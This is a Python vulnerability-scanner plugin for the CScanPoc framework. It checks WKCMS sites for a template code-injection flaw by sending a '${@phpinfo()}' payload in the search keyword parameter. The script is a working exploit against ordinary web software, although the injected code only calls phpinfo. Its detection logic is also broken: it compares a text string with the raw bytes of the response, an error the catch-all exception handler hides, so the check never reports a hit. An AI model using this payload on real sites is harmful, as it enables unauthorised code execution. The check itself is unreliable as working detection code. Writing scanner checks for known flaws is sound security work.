# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'WKCMS_0000'  # 平台漏洞编号，留空
    name = '歪酷CMS /search.html?keyword 任意代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-04-12'  # 漏洞公布时间
    desc = '''
        歪酷网站管理系统(歪酷CMS)是一款基于THINKPHP框架开发的PHP+MYSQL网站建站程序,本程序实现了文章和栏目的批量动态管理,支持栏目无限分类,实现多管理员管理,程序辅助功能也基本实现了常见的文章内关键字替换,文章内自动分页,手动分页,心情投票,留言和评论均采用了AJAX无刷新技术,数据库备份和还原,系统已经实现了伪静态,支持自定义伪静态后缀等等。
        歪酷CMS /search.html?keyword 任意代码执行漏洞
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=048523'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '歪酷CMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3b72ed9e-21dd-49a6-a77a-3cf826bbd0d8'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/index.php/search.html?keyword=%24{%40phpinfo()}'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if '<title>phpinfo()</title>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
